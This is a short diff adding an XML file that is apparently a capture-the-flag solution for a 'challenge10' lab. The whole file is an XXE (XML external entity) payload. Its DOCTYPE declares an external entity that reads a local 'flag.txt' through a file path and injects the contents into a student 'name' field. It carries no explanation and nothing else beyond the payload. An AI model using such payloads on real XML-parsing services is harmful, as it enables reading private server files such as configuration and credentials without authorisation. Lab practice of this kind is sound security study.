@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "C:/xampp/htdocs/challenge10/flag.txt"> ]>
+<class>
+	<student>
+	    <name>&xxe;</name>
+	    <birth>testing</birth>
+	    <school>tetsing</school>
+	</student>
+</class>
